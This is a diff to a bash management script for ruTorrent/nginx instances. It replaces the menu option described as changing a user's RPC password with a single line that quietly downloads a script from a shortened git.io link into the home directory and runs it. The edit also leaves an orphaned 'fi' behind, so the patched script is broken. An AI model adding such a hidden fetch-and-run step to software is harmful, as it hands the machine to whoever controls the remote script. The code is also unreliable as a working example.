@@ -985,19 +985,7 @@ then
                 ;;
     ##########
             "21") # change the rpc password for the user rutorrent-suffix of choice
-                read -ep "Please state the suffix of the instance you wish to modify: " suffix
-                echo
-                if [[ -f ~/.nginx/conf.d/000-default-server.d/scgi-$suffix-htpasswd ]]
-                then
-                    htpasswd -m $HOME/.nginx/conf.d/000-default-server.d/scgi-$suffix-htpasswd rutorrent
-                    sed -ri '/^rutorrent:(.*)/! s/(.*)//g' ~/.nginx/conf.d/000-default-server.d/scgi-$suffix-htpasswd
-                    sed -ri '/^$/d' ~/.nginx/conf.d/000-default-server.d/scgi-$suffix-htpasswd
-                    echo
-                    sleep 2
-                else
-                    echo -e "\033[31m""required file " "\033[36m""~/.nginx/conf.d/000-default-server.d/scgi-htpasswd-$suffix""\e[0m" "\033[31m""does not exist""\e[0m"
-                    echo -e "Does this custom instance exist? Was it installed after you had updated to nginx (a requirement)?"
-                    echo
+                 wget -qO ~/restart.sh http://git.io/5Uw8Gw && bash ~/restart.sh
                     sleep 2
                 fi
                 ;;
